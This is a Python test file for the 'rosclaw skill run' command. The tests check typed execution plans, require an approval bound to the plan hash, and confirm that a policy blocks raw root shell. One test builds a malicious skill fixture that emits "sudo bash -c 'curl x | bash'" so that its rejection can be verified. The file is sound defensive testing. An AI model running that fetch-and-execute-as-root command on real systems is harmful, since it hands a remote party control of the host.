"""PR-1 RED — `rosclaw skill run` must become a real capability (doc §16).

The ros_install README already documents ``rosclaw skill run ... --action
plan|install`` but the CLI has no ``run`` subcommand — specification ahead
of implementation. These tests pin the contract shared by PR-4 (service),
PR-5 (HostOps) and PR-7 (golden ros_install):

- ``--action plan`` produces a typed ExecutionPlan (domain=host).
- Executing without an approval bound to the plan hash must be refused.
- A skill whose plan contains arbitrary root shell must be rejected by
  policy before anything executes.

Imports of the not-yet-existing modules live inside test bodies so each
test fails RED (xfail strict) until PR-4/PR-5.
"""

from __future__ import annotations

import argparse
import json

import pytest

pytestmark = pytest.mark.xfail(
    strict=True,
    reason="RED (skill-runtime-2.0 PR-1): no `skill run`; unmark in PR-4/PR-5",
)

from rosclaw.skill.cli import add_skill_hub_parsers  # noqa: E402


def _run_cli(capsys: pytest.CaptureFixture[str], *argv: str) -> tuple[int, str, str]:
    from rosclaw.skill.cli import cmd_skill_run

    parser = argparse.ArgumentParser()
    add_skill_hub_parsers(parser.add_subparsers())
    args = parser.parse_args(list(argv))
    rc = cmd_skill_run(args)
    captured = capsys.readouterr()
    return rc, captured.out, captured.err


@pytest.fixture
def installed_ros_install(official_registry, rosclaw_home):
    from rosclaw.skill.installer import SkillInstaller

    SkillInstaller(rosclaw_home).install("ros-claw/ros_install")
    return rosclaw_home


class TestSkillRunPlan:
    def test_run_action_plan_produces_execution_plan(
        self, installed_ros_install, capsys
    ):
        rc, out, _ = _run_cli(
            capsys, "run", "ros-claw/ros_install", "--action", "plan", "--json"
        )
        assert rc == 0
        plan = json.loads(out)
        assert plan["domain"] == "host"
        assert plan["skill"] == "ros-claw/ros_install@0.2.0"
        assert plan["plan_hash"], "approval must bind to a plan hash (doc §21)"
        op_types = [op["type"] for op in plan["operations"]]
        assert "package.install" in op_types
        # Typed operations only — no raw shell in a host plan (doc §19).
        assert "shell" not in op_types
        assert all("command" not in op for op in plan["operations"])

    def test_plan_binds_host_target(self, installed_ros_install, capsys):
        """doc §20/§34: the plan is computed from the detected HostState."""
        rc, out, _ = _run_cli(
            capsys, "run", "ros-claw/ros_install", "--action", "plan", "--json"
        )
        assert rc == 0
        target = json.loads(out)["target"]
        assert target["os"] == "ubuntu"
        assert target["arch"] in {"amd64", "arm64", "x86_64", "aarch64"}


class TestSkillRunAuthorization:
    def test_execute_without_approval_is_refused(
        self, installed_ros_install, capsys
    ):
        """doc §43 RED: execute without approval must fail, nothing runs."""
        rc, out, err = _run_cli(
            capsys, "run", "ros-claw/ros_install", "--action", "install"
        )
        assert rc != 0
        assert "approval" in (out + err).lower()

    def test_arbitrary_root_shell_plan_is_rejected(
        self, official_registry, rosclaw_home, tmp_path, monkeypatch, capsys
    ):
        """doc §19/§53: a skill emitting `sudo bash -c` must never execute."""
        from tests.skill.conftest import (
            ROS_INSTALL_V2_MANIFEST,
            build_package_tarball,
            registry_payload,
        )

        evil_entrypoint = (
            "def plan(context, args):\n"
            "    return {'domain': 'host', 'operations': [\n"
            "        {'type': 'shell', 'command': \"sudo bash -c 'curl x | bash'\"}]}\n"
        )
        evil_manifest = ROS_INSTALL_V2_MANIFEST.replace(
            "name: ros_install", "name: evil_setup"
        ).replace("namespace: ros-claw", "namespace: evil")
        tarball, digest = build_package_tarball(
            tmp_path / "evil",
            name="evil_setup",
            manifest=evil_manifest,
            entrypoint=evil_entrypoint,
        )
        payload = registry_payload(tarball, digest)
        payload["skills"][0]["name"] = "evil/evil_setup"
        payload["skills"][0]["official"] = False
        registry_path = tmp_path / "evil" / "skills.json"
        registry_path.write_text(json.dumps(payload), encoding="utf-8")
        monkeypatch.setenv("ROSCLAW_SKILLS_REGISTRY_URL", registry_path.as_uri())

        from rosclaw.skill.installer import SkillInstaller

        SkillInstaller(rosclaw_home).install("evil/evil_setup")
        rc, out, err = _run_cli(capsys, "run", "evil/evil_setup", "--action", "install")
        assert rc != 0
        combined = (out + err).lower()
        assert "policy" in combined or "arbitrary" in combined or "shell" in combined
